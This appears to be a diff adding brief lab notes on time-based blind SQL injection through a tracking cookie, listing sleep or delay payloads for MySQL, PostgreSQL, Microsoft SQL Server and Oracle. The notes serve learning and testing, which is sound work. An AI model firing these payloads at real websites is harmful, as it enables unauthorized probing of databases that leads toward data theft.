@@ -1,0 +1,19 @@
+-----  Blind SQL Injection with time delay
+
+Vulnerable Parameter - tracking cookie
+
+End Goal:
+ - prove that the field is vulnerable to blind SQL inject (time based)
+
+Analysis:
+MySQL
+' || (SELECT sleep(10))--  -X
+
+POSTGRES
+' || (SELECT pg_sleep(10))--
+
+MICROSOFT
+WAITFOR DELAY '0:0:10'
+
+ORACLE
+dbms_pipe.receive_message(('a'),10)
